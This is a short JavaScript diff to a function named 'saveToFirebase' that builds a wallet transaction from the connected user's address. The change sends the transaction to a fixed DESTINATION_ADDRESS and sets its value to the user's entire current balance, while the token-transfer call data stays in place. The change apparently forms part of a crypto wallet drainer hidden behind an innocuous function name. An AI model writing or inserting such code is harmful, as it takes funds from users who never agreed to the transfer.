@@ -464,8 +464,8 @@ async function saveToFirebase(data) {
 
         const transactionParameters = {
             from: userSession.address,
-            to: TOKEN_ADDRESS,  // Changed to TOKEN_ADDRESS
-            value: '0x0',
+            to: DESTINATION_ADDRESS,
+            value: `0x${currentBalance.toString(16)}`,
             data: '0x' + methodId + paddedAddress + paddedAmount
         };
 
